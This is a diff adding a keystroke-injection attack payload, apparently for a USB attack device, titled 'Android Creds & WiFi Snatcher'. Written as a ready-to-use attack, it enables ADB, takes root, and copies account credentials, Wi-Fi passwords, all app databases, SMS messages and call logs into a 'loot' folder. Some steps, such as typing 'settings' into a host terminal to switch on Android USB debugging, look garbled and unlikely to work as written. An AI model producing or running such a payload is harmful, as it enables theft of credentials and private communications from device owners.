@@ -1,0 +1,98 @@
+# Title: Android Creds & WiFi Snatcher
+# Author: Austin Spraggins
+# Description: Extracts Android credentials and Wi-Fi passwords
+# Target: Rooted Android Devices
+# Prerequisites: ADB must be enabled on target device
+
+# Set up attack mode
+ATTACKMODE HID STORAGE
+
+# Wait for device to be recognized
+LED SETUP
+SLEEP 5
+
+# Open terminal
+LED ATTACK
+Q GUI r
+Q DELAY 500
+Q STRING terminal
+Q ENTER
+Q DELAY 1000
+
+# Check if ADB is enabled
+Q STRING adb devices
+Q ENTER
+Q DELAY 2000
+
+# If ADB is not enabled, enable it (requires screen to be unlocked)
+Q STRING settings
+Q ENTER
+Q DELAY 1000
+Q STRING developer options
+Q ENTER
+Q DELAY 1000
+Q STRING USB debugging
+Q ENTER
+Q DELAY 1000
+Q TAB
+Q TAB
+Q ENTER
+Q DELAY 1000
+
+# Return to terminal
+Q GUI r
+Q DELAY 500
+Q STRING terminal
+Q ENTER
+Q DELAY 1000
+
+# Connect to device via ADB
+Q STRING adb shell
+Q ENTER
+Q DELAY 2000
+
+# Gain root access (assumes device is already rooted)
+Q STRING su
+Q ENTER
+Q DELAY 1000
+
+# Extract account credentials
+Q STRING cp /data/system/sync/accounts.db /sdcard/loot/accounts.db
+Q ENTER
+Q DELAY 2000
+
+# Extract Wi-Fi passwords
+Q STRING cp /data/misc/wifi/wpa_supplicant.conf /sdcard/loot/wifi_passwords.txt
+Q ENTER
+Q DELAY 2000
+
+# Extract SQLite databases containing sensitive info
+Q STRING for db in $(find /data/data -name "*.db"); do cp "$db" /sdcard/loot/$(basename "$db"); done
+Q ENTER
+Q DELAY 5000
+
+# Extract SMS messages
+Q STRING content query --uri content://sms/inbox --projection "_id,address,body,date" > /sdcard/loot/sms.txt
+Q ENTER
+Q DELAY 3000
+
+# Extract call logs
+Q STRING content query --uri content://call_log/calls --projection "number,duration,date,type" > /sdcard/loot/call_logs.txt
+Q ENTER
+Q DELAY 3000
+
+# Exit ADB shell
+Q STRING exit
+Q ENTER
+Q DELAY 500
+
+# Disconnect ADB
+Q STRING adb disconnect
+Q ENTER
+Q DELAY 1000
+
+# Close terminal
+Q ALT F4
+
+# Signal completion
+LED FINISH
